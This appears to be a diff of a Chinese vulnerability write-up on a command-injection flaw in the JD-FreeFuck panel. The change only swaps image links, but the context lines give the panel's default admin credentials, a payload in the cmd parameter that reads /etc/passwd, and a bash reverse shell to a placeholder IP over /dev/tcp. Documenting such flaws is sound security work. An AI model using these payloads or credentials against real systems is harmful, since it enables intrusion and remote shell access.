@@ -22,13 +22,13 @@ JD-FreeFuck 存在后台命令执行漏洞，由于传参执行命令时没有�
 
 访问后登录页面如下
 
-![](image/jd-1.png)
+![](http://wikioss.peiqi.tech/vuln/jd-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 默认账号密码为 
 
 **useradmin/supermanito**
 
-![](image/jd-2.png)
+![](http://wikioss.peiqi.tech/vuln/jd-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 发送如下请求包执行命令
 
@@ -52,7 +52,7 @@ cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&delay=500
 
 其中 cmd 参数存在命令注入
 
-![](image/jd-3.png)
+![](http://wikioss.peiqi.tech/vuln/jd-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 反弹shell
 
@@ -60,7 +60,7 @@ cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&delay=500
 cmd=bash+jd.sh+%3Bbash+-c+'exec+bash+-i+%26%3E%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999+%3C%261'%3B+now&delay=500
 ```
 
-![](image/jd-4.png)
+![](http://wikioss.peiqi.tech/vuln/jd-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## 参考文章
 
